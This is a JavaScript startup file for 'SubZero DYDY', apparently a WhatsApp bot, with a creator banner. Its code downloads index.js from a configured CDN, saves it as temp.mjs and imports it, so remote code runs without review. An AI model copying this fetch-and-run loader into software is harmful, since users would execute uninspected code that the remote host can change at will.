/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

@ Project Name : SubZero DYDY
* Creator      : THOMAS Lenzarry Kendy (DYDY LE VIDE)
* My Git       : https//github.com/Ghost-Fox
* Contact      : wa.me/50932028973
* Channel      :
* Release Date : 15 December 2024 12.01 AM
*/

// ZIMBABWEAN STAR ON TOP

import axios from 'axios';
import config from './settings.js';
import fs from 'fs/promises';
import path from 'path';

const TEMP_FILE = './temp.mjs';

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");

    const { data: scriptCode } = await axios.get(
      `${config.CDN}/mrfrank/index.js`
    );

    // Save remote script temporarily
    await fs.writeFile(TEMP_FILE, scriptCode);

    // Import it as ESM
    await import(path.resolve(TEMP_FILE));

  } catch (err) {
    console.error("Error:", err);
  }
})();
